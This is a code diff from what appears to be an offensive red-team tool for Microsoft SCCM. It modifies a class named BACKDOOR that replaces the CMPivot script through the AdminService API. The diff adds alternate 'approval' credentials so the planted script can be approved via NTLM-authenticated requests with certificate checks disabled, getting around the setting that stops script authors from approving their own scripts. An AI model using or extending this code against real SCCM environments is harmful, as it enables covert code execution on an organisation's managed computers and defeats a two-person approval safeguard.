@@ -13,11 +13,13 @@ from lib.logger import logger
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 class BACKDOOR:
-    def __init__(self, username, password, target, logs_dir):
+    def __init__(self, username, password, target, logs_dir, auser, apassword):
         self.username = username
         self.password = password
         self.target = target
         self.logs_dir = logs_dir
+        self.approve_user = auser
+        self.approve_password = apassword
         self.backdoor_script = ""
         self.headers = {'Content-Type': 'application/json; odata=verbose'}
 
@@ -124,6 +126,13 @@ Do-Delete
 
     def approve_cmpivot(self):
         try:
+            if self.approve_user:
+                 logger.debug("[*] Using alternate credentials to approve script.")
+                 username = self.approve_user
+                 password = self.approve_password
+            else:
+                 username= self.username
+                 password = self.password
             #approve changes
             url = f"https://{self.target}/AdminService/wmi/SMS_Scripts/7DC6B6F1-E7F6-43C1-96E0-E1D16BC25C14/AdminService.UpdateApprovalState"
 
@@ -133,7 +142,7 @@ Do-Delete
                     }
 
             r = requests.post(f"{url}",
-                        auth=HttpNtlmAuth(self.username, self.password),
+                        auth=HttpNtlmAuth(username, password),
                         verify=False,
                         headers=self.headers, json=body)
             if r.status_code == 201:
@@ -141,6 +150,8 @@ Do-Delete
                 return
             if r.status_code == 500:
                 logger.info(f"[-] Hierarchy settings do not allow author's to approve their own scripts. All custom script execution will fail.")
+                logger.info("[*] Try using alternate approval credentials.")
+                logger.info("[!] CMPivot will be unusable until the script is approved.")
                 return
             else:
                 logger.info("[*] Something went wrong:")
